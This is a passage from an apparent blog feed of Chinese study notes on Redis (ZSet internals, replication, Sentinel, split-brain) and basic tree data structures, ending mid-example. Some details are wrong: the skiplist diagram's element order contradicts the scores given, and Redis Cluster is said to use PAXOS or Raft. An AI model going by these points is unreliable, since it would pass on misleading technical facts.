href="#ZSet-底层用了两个结构：" class="headerlink" title="ZSet 底层用了两个结构："></a>ZSet 底层用了两个结构：</h3><ol><li><strong>哈希表（dict）</strong><ul><li>快速定位元素对应的 score</li><li>key 是元素，value 是 score</li></ul></li><li><strong>跳表（skiplist）</strong><ul><li>维持元素按 score 升序排列</li><li>用于支持范围查找、区间遍历、按排名查询等</li></ul></li></ol><p>为什么用跳表而不是红黑树？</p><ul><li>插入&#x2F;删除逻辑简单</li><li>查询效率也接近 O(log n)</li><li>Redis 追求极致性能，跳表是工程中性能 + 简洁度权衡最佳的结构</li></ul><hr><h2 id="核心操作和性能"><a href="#核心操作和性能" class="headerlink" title="核心操作和性能"></a>核心操作和性能</h2><table><thead><tr><th>操作</th><th>命令</th><th>时间复杂度</th><th>说明</th></tr></thead><tbody><tr><td>添加&#x2F;更新元素</td><td><code>ZADD key score member</code></td><td>O(log n)</td><td>插入或更新元素，跳表中调整顺序</td></tr><tr><td>删除元素</td><td><code>ZREM key member</code></td><td>O(log n)</td><td>删除成员，同时从 dict 和 skiplist 删除</td></tr><tr><td>查询成员的分数</td><td><code>ZSCORE key member</code></td><td>O(1)</td><td>直接从 dict 中查</td></tr><tr><td>按排名查成员</td><td><code>ZRANGE key start stop</code></td><td>O(log n + m)</td><td>从跳表中按顺序取元素</td></tr><tr><td>查某个成员的排名</td><td><code>ZRANK key member</code></td><td>O(log n)</td><td>在跳表中向下查找节点，统计 rank</td></tr><tr><td>范围删除</td><td><code>ZREMRANGEBYSCORE key min max</code></td><td>O(log n + m)</td><td>从跳表中范围定位，然后批量删除</td></tr><tr><td>分数区间查找</td><td><code>ZRANGEBYSCORE key min max</code></td><td>O(log n + m)</td><td>先用跳表查 min，再往后遍历</td></tr><tr><td>获取总数</td><td><code>ZCARD key</code></td><td>O(1)</td><td>获取元素个数</td></tr><tr><td>获取某 score 范围内的个数</td><td><code>ZCOUNT key min max</code></td><td>O(log n)</td><td>范围查找后累加统计</td></tr></tbody></table><p>其中 <code>m</code> 表示范围内返回的元素数量。</p><hr><h2 id="跳表结构内部逻辑（示意）"><a href="#跳表结构内部逻辑（示意）" class="headerlink" title="跳表结构内部逻辑（示意）"></a>跳表结构内部逻辑（示意）</h2><p>以一个 ZSet 示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ZADD z 5 alice</span><br><span class="line">ZADD z 10 bob</span><br><span class="line">ZADD z 7 tom</span><br><span class="line">ZADD z 1 kate</span><br></pre></td></tr></table></figure><p>跳表结构会长成这样（层数为随机生成的）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Level 3:            bob</span><br><span class="line">Level 2:      tom - bob</span><br><span class="line">Level 1: kate - tom - alice - bob</span><br></pre></td></tr></table></figure><p>每一层是有序链表，底层记录所有元素，查询从顶层开始，逐层往下，最终在底层找到目标。</p><hr><h2 id="应用场景举例"><a href="#应用场景举例" class="headerlink" title="应用场景举例"></a>应用场景举例</h2><h3 id="排行榜（经典）"><a href="#排行榜（经典）" class="headerlink" title="排行榜（经典）"></a>排行榜（经典）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ZADD game 1000 user1</span><br><span class="line">ZADD game 950 user2</span><br><span class="line">ZADD game 1200 user3</span><br><span class="line">ZRANGE game 0 -1 WITHSCORES   <span class="comment"># 按分数升序输出所有玩家</span></span><br><span class="line">ZREVRANK game user1           <span class="comment"># 查看 user1 的排名（倒序）</span></span><br></pre></td></tr></table></figure><h3 id="延时队列"><a href="#延时队列" class="headerlink" title="延时队列"></a>延时队列</h3><p>用 score 表示未来的执行时间戳：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ZADD task_queue 1680000000 task_id_123</span><br><span class="line">ZRANGEBYSCORE task_queue 0 1680001000 LIMIT 0 1</span><br><span class="line"><span class="comment"># 查当前需要执行的任务</span></span><br></pre></td></tr></table></figure><h3 id="动态权重调度（比如任务优先级）"><a href="#动态权重调度（比如任务优先级）" class="headerlink" title="动态权重调度（比如任务优先级）"></a>动态权重调度（比如任务优先级）</h3><p>score 表示优先级，值越小优先级越高：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ZADD job 1 job1</span><br><span class="line">ZADD job 3 job2</span><br><span class="line">ZRANGE job 0 0        <span class="comment"># 获取优先级最高的任务</span></span><br><span class="line">ZREM job job1         <span class="comment"># 删除执行完成的任务</span></span><br></pre></td></tr></table></figure><hr><h2 id="与-List、Set、Hash-的对比"><a href="#与-List、Set、Hash-的对比" class="headerlink" title="与 List、Set、Hash 的对比"></a>与 List、Set、Hash 的对比</h2><table><thead><tr><th>结构</th><th>是否排序</th><th>是否支持范围查找</th><th>插入&#x2F;查找复杂度</th><th>用途</th></tr></thead><tbody><tr><td>List</td><td>按插入顺序</td><td>支持（按位置）</td><td>O(1)&#x2F;O(n)</td><td>消息队列</td></tr><tr><td>Set</td><td>无序</td><td>不支持</td><td>O(1)</td><td>唯一元素集合</td></tr><tr><td>ZSet</td><td>按 score 排序</td><td>支持</td><td>O(log n)</td><td>排行榜、延迟队列</td></tr><tr><td>Hash</td><td>无序</td><td>不支持</td><td>O(1)</td><td>映射结构</td></tr></tbody></table><hr><h2 id="内存占用注意事项"><a href="#内存占用注意事项" class="headerlink" title="内存占用注意事项"></a>内存占用注意事项</h2><p>ZSet 中的跳表节点比较复杂，包含：</p><ul><li>元素值（字符串）</li><li>score（double）</li><li>多级 forward 指针</li><li>span 用于计算 rank</li></ul><p>如果元素很多、节点层数高，跳表的内存占用会比普通链表&#x2F;集合大，需要注意评估。</p><hr><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><ul><li>ZSet 是 Redis 提供的<strong>有序集合结构</strong></li><li>底层是 <strong>哈希表 + 跳表</strong> 的组合，既支持快速定位，也支持按顺序遍历</li><li>提供排名、区间删除、分数查找、范围扫描等高级操作</li><li>实现简单、查询快、非常适合排行榜、权重调度、定时任务等场景</li><li>是 Redis 中最具代表性的高性能数据结构之一</li></ul><p>好的，我们进入 Redis 学习的第五讲，讲解：</p><hr><h1 id="Redis-的主从复制与-Sentinel-高可用机制"><a href="#Redis-的主从复制与-Sentinel-高可用机制" class="headerlink" title="Redis 的主从复制与 Sentinel 高可用机制"></a>Redis 的主从复制与 Sentinel 高可用机制</h1><p>在生产环境中，单台 Redis 实例面临<strong>单点故障</strong>、<strong>无法扩容</strong>等问题。为了解决这类问题，Redis 提供了主从复制和哨兵机制（Sentinel），实现基本的高可用。</p><hr><h2 id="主从复制（Replication）"><a href="#主从复制（Replication）" class="headerlink" title="主从复制（Replication）"></a>主从复制（Replication）</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul><li>实现读写分离（主写从读）</li><li>提供故障转移能力的基础</li><li>多机热备，提高数据安全性</li></ul><h3 id="架构示意"><a href="#架构示意" class="headerlink" title="架构示意"></a>架构示意</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Client</span><br><span class="line">       |</span><br><span class="line">    +------+       +------+</span><br><span class="line">    | Master | --&gt; | Slave1|</span><br><span class="line">    +------+       +------+</span><br><span class="line">                      |</span><br><span class="line">                   +------+</span><br><span class="line">                   |Slave2|</span><br><span class="line">                   +------+</span><br></pre></td></tr></table></figure><h3 id="启动主从复制"><a href="#启动主从复制" class="headerlink" title="启动主从复制"></a>启动主从复制</h3><p>在从库的 redis.conf 中设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replicaof &lt;master-ip&gt; &lt;master-port&gt;</span><br></pre></td></tr></table></figure><p>或者运行时命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replicaof 127.0.0.1 6379</span><br></pre></td></tr></table></figure><h3 id="同步过程"><a href="#同步过程" class="headerlink" title="同步过程"></a>同步过程</h3><ol><li>从库连接主库，发送 <code>PSYNC</code> 命令</li><li>首次同步：主库执行 BGSAVE 生成 RDB 文件并发送给从库</li><li>增量同步：之后通过命令流（replication backlog）持续同步</li></ol><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>主库写，从库同步，数据最终一致</li><li>从库是只读状态</li><li>支持链式结构（slave -&gt; slave）</li></ul><hr><h2 id="Sentinel（哨兵）机制"><a href="#Sentinel（哨兵）机制" class="headerlink" title="Sentinel（哨兵）机制"></a>Sentinel（哨兵）机制</h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><ul><li>自动监控 Redis 主从节点状态</li><li>主节点故障时，<strong>自动故障转移（failover）</strong></li><li>提供主节点的服务发现功能</li></ul><h3 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+---------+         +---------+         +---------+</span><br><span class="line">|Sentinel1|         |Sentinel2|         |Sentinel3|</span><br><span class="line">+----+----+         +----+----+         +----+----+</span><br><span class="line">     \                    |                   /</span><br><span class="line">      \                  |                  /</span><br><span class="line">       \                |                 /</span><br><span class="line">        +------------+  |  +------------+</span><br><span class="line">                     |  |  |</span><br><span class="line">                  +--v--v--v--+</span><br><span class="line">                  |  Master   |</span><br><span class="line">                  +--+-----+--+</span><br><span class="line">                     |     |</span><br><span class="line">                  +--v--+ +--v--+</span><br><span class="line">                  |Slave1| |Slave2|</span><br><span class="line">                  +------+ +------+</span><br></pre></td></tr></table></figure><h3 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h3><ol><li><strong>监控（Monitor）</strong>：定时 PING 主从节点</li><li><strong>通知（Notification）</strong>：主节点异常后发起故障报告</li><li><strong>投票（Leader Election）</strong>：多个哨兵协商选主</li><li><strong>故障转移（Failover）</strong>：重新选主并通知所有从库更新主节点</li></ol><h3 id="配置示例-1"><a href="#配置示例-1" class="headerlink" title="配置示例"></a>配置示例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sentinel monitor mymaster 127.0.0.1 6379 2</span><br><span class="line">sentinel down-after-milliseconds mymaster 5000</span><br><span class="line">sentinel failover-timeout mymaster 10000</span><br><span class="line">sentinel parallel-syncs mymaster 1</span><br></pre></td></tr></table></figure><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ul><li>最少部署 3 个哨兵节点，确保仲裁可靠性</li><li>会自动修改从库指向新主库</li><li>与客户端配合使用，实现服务发现（客户端动态连接主节点）</li></ul><hr><h2 id="自问自答-3"><a href="#自问自答-3" class="headerlink" title="自问自答"></a>自问自答</h2><ol><li>Redis 主从同步机制是什么？全量同步和增量同步怎么实现？</li><li>Redis Sentinel 的作用是什么？如何实现自动故障转移？</li><li>Redis 主从架构如何避免脑裂？</li><li>Redis 从库能写入吗？为什么？</li><li>Redis Sentinel 和 ZooKeeper 的区别？</li></ol><hr><h2 id="实战建议-2"><a href="#实战建议-2" class="headerlink" title="实战建议"></a>实战建议</h2><table><thead><tr><th>建议</th><th>理由</th></tr></thead><tbody><tr><td>使用至少 1 主 2 从 3 哨兵结构</td><td>实现高可用、读写分离</td></tr><tr><td>设置 <code>min-slaves-to-write</code></td><td>保证主库写操作安全</td></tr><tr><td>Sentinel + 客户端主节点发现</td><td>防止客户端连接老主节点</td></tr><tr><td>定期监控主从延迟</td><td>避免读到旧数据</td></tr></tbody></table><h1 id="Redis-主从架构如何避免脑裂"><a href="#Redis-主从架构如何避免脑裂" class="headerlink" title="Redis 主从架构如何避免脑裂"></a>Redis 主从架构如何避免脑裂</h1><h2 id="使用-Redis-Sentinel（哨兵）"><a href="#使用-Redis-Sentinel（哨兵）" class="headerlink" title="使用 Redis Sentinel（哨兵）"></a>使用 Redis Sentinel（哨兵）</h2><p>Redis Sentinel 是官方提供的高可用性解决方案，主要用于监控 Redis 实例的状态，进行故障转移，并通知管理员。通过 Redis Sentinel 可以有效避免脑裂问题，具体做法包括：</p><ul><li><strong>监控主从节点</strong>：Sentinel 定期检查 Redis 实例的健康状况，一旦主节点不可用，Sentinel 会自动选举一个新的主节点。</li><li><strong>故障转移</strong>：当检测到主节点不可用时，Sentinel 会从从节点中选举一个新的主节点，自动进行故障转移，确保服务的持续可用。</li><li><strong>通知报警</strong>：在发生故障时，Sentinel 会通过邮件、短信等方式通知管理员，便于及时处理。</li></ul><p>这种方式可以确保即使主节点失效，从节点能够迅速接管，减少脑裂的风险。</p><h2 id="配置-auto-aof-rewrite-和-appendonly"><a href="#配置-auto-aof-rewrite-和-appendonly" class="headerlink" title="配置 auto-aof-rewrite 和 appendonly"></a>配置 <code>auto-aof-rewrite</code> 和 <code>appendonly</code></h2><p>Redis 在启用 AOF（Append Only File）持久化模式时，每个写操作都会被记录到 AOF 文件中，这样可以在恢复时保持数据一致性。脑裂发生时，如果从节点与主节点的数据不一致，AOF 文件可以在重启时应用，确保数据恢复。</p><p>然而，仅依赖 AOF 并不能完全避免脑裂，结合 Redis Sentinel 可以增强整体的高可用性和一致性。</p><h2 id="配置-min-slaves-to-write-和-min-slaves-max-lag"><a href="#配置-min-slaves-to-write-和-min-slaves-max-lag" class="headerlink" title="配置 min-slaves-to-write 和 min-slaves-max-lag"></a>配置 <code>min-slaves-to-write</code> 和 <code>min-slaves-max-lag</code></h2><p>为了减少脑裂的可能性，可以在主节点上配置以下参数：</p><ul><li><code>**min-slaves-to-write**</code>：在进行写操作时，主节点要求至少有 N 个从节点同步确认。这有助于确保主节点的数据不会丢失，并避免主从数据不一致。</li><li><code>**min-slaves-max-lag**</code>：限制从节点的最大延迟，如果某些从节点的同步延迟过大，主节点将停止接受写操作，避免因为数据延迟而导致的数据不一致。</li></ul><p>通过这些配置，确保主节点只有在至少一部分从节点同步成功的情况下才会执行写操作，有助于减少脑裂的发生。</p><h2 id="使用-Redis-Cluster（集群）"><a href="#使用-Redis-Cluster（集群）" class="headerlink" title="使用 Redis Cluster（集群）"></a>使用 Redis Cluster（集群）</h2><p>Redis 集群是一种分布式部署方式，能够通过分片将数据分布到多个节点上，每个主节点都有一个或多个从节点进行备份。在 Redis 集群中：</p><ul><li><strong>主从备份</strong>：每个主节点都有一个或多个从节点作为备份，确保主节点故障时可以进行快速的故障转移。</li><li><strong>自动选举</strong>：集群内部会自动进行主节点的选举，避免了因为某个节点不可用而导致的数据不一致。</li><li><strong>PAXOS 或 Raft 协议</strong>：集群内部使用一致性协议来确保数据的一致性，避免脑裂问题。</li></ul><p>使用 Redis 集群可以通过分布式架构减少单点故障的影响，自动化的故障转移机制有效降低了脑裂发生的几率。</p><h2 id="合理设计客户端架构"><a href="#合理设计客户端架构" class="headerlink" title="合理设计客户端架构"></a>合理设计客户端架构</h2><p>为了避免在 Redis 主从架构中发生脑裂问题，客户端架构需要能够动态适应主从节点的变化。现代 Redis 客户端（如 <code>redis-py</code>）通常支持与 Redis Sentinel 或 Redis Cluster 协作，能够自动获取当前的主节点信息，并在发生故障时自动切换连接。</p><p>客户端应具备以下功能：</p><ul><li><strong>自动发现主节点</strong>：客户端能够自动从 Sentinel 或集群获取主节点信息，确保在节点变化时无缝切换。</li><li><strong>支持故障转移</strong>：客户端支持 Sentinel 的故障转移机制，能够在主节点不可用时自动连接到新的主节点。</li></ul><p>通过设计智能客户端，可以减少由于节点故障带来的脑裂问题。</p><h2 id="监控和报警系统"><a href="#监控和报警系统" class="headerlink" title="监控和报警系统"></a>监控和报警系统</h2><p>除了配置 Redis Sentinel 和 Redis 集群外，建立全面的监控和报警系统同样重要。通过监控 Redis 实例的健康状态，可以在节点出现异常时及时发现问题，避免脑裂的发生。</p><p>常见的监控项包括：</p><ul><li>节点的连接状态和响应时间</li><li>主从同步的延迟</li><li>Redis 实例的内存和 CPU 使用情况</li></ul><p>结合报警系统，确保在发生故障时能够迅速采取措施进行修复，防止脑裂的发生。</p><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>通过使用 Redis Sentinel 或 Redis 集群，并合理配置主从同步策略，可以有效避免 Redis 主从架构中的脑裂问题。此外，设计智能客户端架构和建立完善的监控报警机制，也能进一步提升系统的容错能力，确保 Redis 在高可用性和一致性方面的稳定运行。</p><h1 id="Redis-Sentinel-和-ZooKeeper-的区别"><a href="#Redis-Sentinel-和-ZooKeeper-的区别" class="headerlink" title="Redis Sentinel 和 ZooKeeper 的区别"></a>Redis Sentinel 和 ZooKeeper 的区别</h1><h2 id="设计目标和功能"><a href="#设计目标和功能" class="headerlink" title="设计目标和功能"></a>设计目标和功能</h2><p><strong>Redis Sentinel</strong>： Redis Sentinel 是专为 Redis 提供高可用性解决方案的工具。它主要负责监控 Redis 实例，检测主节点的状态，并在主节点故障时执行自动故障转移，将从节点提升为新的主节点。它的核心功能包括故障检测、故障转移、通知和监控。Redis Sentinel 适用于 Redis 集群的高可用性管理。</p><p><strong>ZooKeeper</strong>： ZooKeeper 是一个分布式协调服务，旨在帮助不同的分布式应用系统管理配置、命名、同步服务等。它不仅限于 Redis，广泛用于需要高一致性和协调的分布式系统中。ZooKeeper 提供了分布式锁、配置管理、节点监控、领导者选举等多种功能，适用于大规模的分布式应用。ZooKeeper 提供的强一致性协议使得它适用于任何需要分布式协调的应用。</p><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p>Redis Sentinel 和 ZooKeeper 都是高可用性和分布式系统中的重要工具，但它们的应用场景、设计目标和功能有所不同。Redis Sentinel 专为 Redis 提供高可用性解决方案，适用于 Redis 集群的监控和故障转移。而 ZooKeeper 是一个通用的分布式协调服务，适用于广泛的分布式系统，提供强一致性和协调功能，支持更复杂的分布式应用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;I-O多路复用是什么&quot;&gt;&lt;a href=&quot;#I-O多路复用是什么&quot; class=&quot;headerlink&quot; title=&quot;I&amp;#x2F;O多路复用是什么&quot;&gt;&lt;/a&gt;I&amp;#x2F;O多路复用是什么&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;I&amp;#x2F;O 多路复用&lt;/stron</summary>
      
    
    
    
    
    <category term="Redis" scheme="https://lyi61pd.github.io/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>数据结构</title>
    <link href="https://lyi61pd.github.io/2025/04/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <id>https://lyi61pd.github.io/2025/04/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</id>
    <published>2025-04-03T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.101Z</updated>
    
    <content type="html"><![CDATA[<p>快速回忆下大学的数据结构课， 这些看完， 大概下面这些能理解一点啦~</p><ul><li>树</li><li>二叉查找树</li><li>完全二叉树</li><li>平衡二叉树</li><li>n叉树</li><li>树的遍历</li><li>B+树</li><li>跳表</li><li>红黑树</li><li>AVL树</li><li>B树</li></ul><h1 id="树的基本概念"><a href="#树的基本概念" class="headerlink" title="树的基本概念"></a>树的基本概念</h1><p>学习树的基础是理解更复杂的树结构（如红黑树、AVL树等）的前提。让我们从最基本的树概念开始。</p><p><strong>树</strong>（Tree）是一种非线性的数据结构，由节点（Node）组成，节点之间通过边（Edge）连接。树的结构很像倒立的家谱图或者文件系统的结构。</p><p>树是由根节点（Root）开始，经过多个层级的分支（Branch），直到叶子节点（Leaf）</p><h2 id="树的基本术语："><a href="#树的基本术语：" class="headerlink" title="树的基本术语："></a>树的基本术语：</h2><ul><li><strong>根节点（Root）</strong>：树的起始节点，没有父节点。</li><li><strong>节点（Node）</strong>：树中的每个元素，包含数据部分以及指向其他节点的指针（或引用）。</li><li><strong>边（Edge）</strong>：节点之间的连接。</li><li><strong>子节点（Child）</strong>：直接连接到某个节点的节点，称为该节点的子节点。</li><li><strong>父节点（Parent）</strong>：一个节点的直接连接节点是它的父节点。</li><li><strong>叶子节点（Leaf）</strong>：没有子节点的节点。</li><li><strong>高度（Height）</strong>：树的高度是从根节点到最深的叶子节点的最长路径的长度（也可以理解为树的层级数）。</li><li><strong>深度（Depth）</strong>：节点的深度是从根节点到该节点的路径长度。</li><li><strong>层级（Level）</strong>：树中的每一层，通常层级从0开始（根节点是第0层）。</li></ul><h2 id="树的类型"><a href="#树的类型" class="headerlink" title="树的类型"></a>树的类型</h2><p>树可以有不同的形式，以下是几种常见的树类型：</p><h3 id="二叉树-Binary-Tree"><a href="#二叉树-Binary-Tree" class="headerlink" title="二叉树 (Binary Tree)"></a>二叉树 (Binary Tree)</h3><ul><li><strong>定义</strong>：每个节点最多有两个子节点，通常称为左子节点和右子节点。</li><li><strong>特点</strong>：<ul><li>每个节点最多有两个子节点。</li><li>二叉树的每个节点可以有不同数量的子节点（0个、1个或2个）。</li></ul></li><li><strong>用途</strong>：二叉树是很多复杂树结构的基础，例如二叉查找树、堆等。</li></ul><h3 id="二叉查找树-Binary-Search-Tree-BST"><a href="#二叉查找树-Binary-Search-Tree-BST" class="headerlink" title="二叉查找树 (Binary Search Tree, BST)"></a>二叉查找树 (Binary Search Tree, BST)</h3><ul><li><strong>定义</strong>：它是一种特殊的二叉树，节点的左子树上的所有值都小于节点的值，右子树上的所有值都大于节点的值。</li><li><strong>特点</strong>：<ul><li>左子树的所有节点的值都小于根节点。</li><li>右子树的所有节点的值都大于根节点。</li><li>这使得搜索操作可以通过比较快速地确定走向左子树还是右子树。</li></ul></li><li><strong>用途</strong>：用于实现高效的查找、插入、删除等操作。</li></ul><h3 id="完全二叉树-Complete-Binary-Tree"><a href="#完全二叉树-Complete-Binary-Tree" class="headerlink" title="完全二叉树 (Complete Binary Tree)"></a>完全二叉树 (Complete Binary Tree)</h3><ul><li><strong>定义</strong>：一个二叉树，除了最后一层外，其他层都是满的，并且最后一层的节点都靠左排列。</li><li><strong>特点</strong>：<ul><li>除了最后一层，其他层的节点数量都是满的。</li><li>最后一层的节点从左到右填充。</li></ul></li><li><strong>用途</strong>：常用于堆（如大顶堆和小顶堆）等数据结构。</li></ul><h3 id="平衡二叉树-Balanced-Binary-Tree"><a href="#平衡二叉树-Balanced-Binary-Tree" class="headerlink" title="平衡二叉树 (Balanced Binary Tree)"></a>平衡二叉树 (Balanced Binary Tree)</h3><ul><li><strong>定义</strong>：平衡二叉树是一种二叉树，要求每个节点的左右子树高度差不超过一定的范围（如 AVL 树就是一种平衡二叉树）。</li><li><strong>特点</strong>：<ul><li>保证树的高度较低，避免树退化成链表。</li><li>高效的查找、插入和删除操作。</li></ul></li><li><strong>用途</strong>：如 AVL 树、红黑树等，广泛用于数据库索引。</li></ul><h3 id="n叉树-n-ary-Tree"><a href="#n叉树-n-ary-Tree" class="headerlink" title="n叉树 (n-ary Tree)"></a>n叉树 (n-ary Tree)</h3><ul><li><strong>定义</strong>：n叉树是每个节点最多有n个子节点的树。</li><li><strong>特点</strong>：<ul><li>每个节点最多有n个子节点。</li><li>常用于表示具有多层次的复杂数据结构，如文件系统。</li></ul></li></ul><h2 id="树的遍历"><a href="#树的遍历" class="headerlink" title="树的遍历"></a>树的遍历</h2><p>树的遍历是指访问树中所有节点的过程。常见的树的遍历方式有三种：</p><h3 id="前序遍历-Preorder-Traversal"><a href="#前序遍历-Preorder-Traversal" class="headerlink" title="前序遍历 (Preorder Traversal)"></a>前序遍历 (Preorder Traversal)</h3><ul><li><strong>步骤</strong>：先访问当前节点，然后递归地前序遍历左子树，再递归地前序遍历右子树。</li><li><strong>顺序</strong>：根节点 → 左子树 → 右子树。</li></ul><h3 id="中序遍历-Inorder-Traversal"><a href="#中序遍历-Inorder-Traversal" class="headerlink" title="中序遍历 (Inorder Traversal)"></a>中序遍历 (Inorder Traversal)</h3><ul><li><strong>步骤</strong>：递归地中序遍历左子树，访问当前节点，然后递归地中序遍历右子树。</li><li><strong>顺序</strong>：左子树 → 根节点 → 右子树。</li><li><strong>特点</strong>：二叉查找树的中序遍历结果是按从小到大的顺序排列的。</li></ul><h3 id="后序遍历-Postorder-Traversal"><a href="#后序遍历-Postorder-Traversal" class="headerlink" title="后序遍历 (Postorder Traversal)"></a>后序遍历 (Postorder Traversal)</h3><ul><li><strong>步骤</strong>：递归地后序遍历左子树，再递归地后序遍历右子树，然后访问当前节点。</li><li><strong>顺序</strong>：左子树 → 右子树 → 根节点。</li></ul><h3 id="层次遍历-Level-Order-Traversal"><a href="#层次遍历-Level-Order-Traversal" class="headerlink" title="层次遍历 (Level Order Traversal)"></a>层次遍历 (Level Order Traversal)</h3><ul><li><strong>步骤</strong>：按层级遍历树的节点，通常使用队列来实现。</li><li><strong>顺序</strong>：根节点 → 第一层 → 第二层 → 第三层 → ……直到最后一层。</li></ul><h2 id="树的应用"><a href="#树的应用" class="headerlink" title="树的应用"></a>树的应用</h2><p>树作为一种数据结构，有许多实际应用，常见的包括：</p><ul><li><strong>文件系统</strong>：文件和目录组织成树形结构，根目录是树的根节点，文件和文件夹是节点。</li><li><strong>数据库索引</strong>：树结构（如B树、B+树）常用于数据库的索引，帮助快速查找数据。</li><li><strong>游戏决策树</strong>：用于表示游戏中的可能决策路径。</li></ul><hr><h2 id="二叉查找树（Binary-Search-Tree-BST）"><a href="#二叉查找树（Binary-Search-Tree-BST）" class="headerlink" title="二叉查找树（Binary Search Tree, BST）"></a>二叉查找树（Binary Search Tree, BST）</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>二叉查找树是一种特殊的二叉树，满足以下性质：</p><ul><li>每个节点最多有两个子节点。</li><li>左子树中所有节点的值小于根节点。</li><li>右子树中所有节点的值大于根节点。</li><li>每一棵子树也都是一棵二叉查找树。</li></ul><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p><strong>查找（Search）</strong></p><p>从根节点开始：</p><ul><li>如果目标值等于当前节点，返回。</li><li>如果目标值小于当前节点，进入左子树。</li><li>如果目标值大于当前节点，进入右子树。</li></ul><p>查找的时间复杂度与树的高度有关，最坏是 O(n)，最优是 O(log n)。</p><p><strong>插入（Insert）</strong></p><p>插入值时，按查找路径向下走，找到空位插入即可，不会破坏 BST 结构。</p><p><strong>删除（Delete）</strong></p><p>分三种情况处理：</p><ol><li>删除叶子节点，直接删除。</li><li>删除只有一个子节点的节点，用子节点替换该节点。</li><li>删除有两个子节点的节点，找到该节点的中序后继或中序前驱，用它的值替换当前节点，再删除那个节点。</li></ol><h3 id="问题：BST-可能退化成链表"><a href="#问题：BST-可能退化成链表" class="headerlink" title="问题：BST 可能退化成链表"></a>问题：BST 可能退化成链表</h3><p>如果连续插入有序数据，例如 1、2、3、4、5，树就会变成单边链表，导致查找效率退化为 O(n)。</p><p>为了解决这个问题，就需要引入“自平衡”的机制，也就是平衡二叉树。</p><hr><h2 id="平衡二叉树的基本思想"><a href="#平衡二叉树的基本思想" class="headerlink" title="平衡二叉树的基本思想"></a>平衡二叉树的基本思想</h2><h3 id="什么是平衡"><a href="#什么是平衡" class="headerlink" title="什么是平衡"></a>什么是平衡</h3><p>树的高度决定了查找、插入、删除的效率。所谓平衡，是指尽量保持每个节点的左右子树高度差不要太大，避免形成单边长链。</p><p>平衡树的目标是让树的高度保持在 O(log n) 以内，从而提高整体性能。</p><h3 id="平衡的实现手段：旋转操作"><a href="#平衡的实现手段：旋转操作" class="headerlink" title="平衡的实现手段：旋转操作"></a>平衡的实现手段：旋转操作</h3><p>当插入或删除节点后导致失衡，可以通过旋转操作让树重新平衡。</p><p><strong>左旋</strong></p><p>将某个节点的右子节点提升为新的父节点，原父节点变为其左子节点。</p><p>例子： 节点 A 有右子节点 B，B 再有右子节点 C</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">原始结构：</span><br><span class="line">    A</span><br><span class="line">     \</span><br><span class="line">      B</span><br><span class="line">       \</span><br><span class="line">        C</span><br><span class="line"></span><br><span class="line">左旋后：</span><br><span class="line">    B</span><br><span class="line">   / \</span><br><span class="line">  A   C</span><br></pre></td></tr></table></figure><p><strong>右旋</strong></p><p>将某个节点的左子节点提升为新的父节点，原父节点变为其右子节点。</p><p>例子： 节点 C 有左子节点 B，B 再有左子节点 A</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 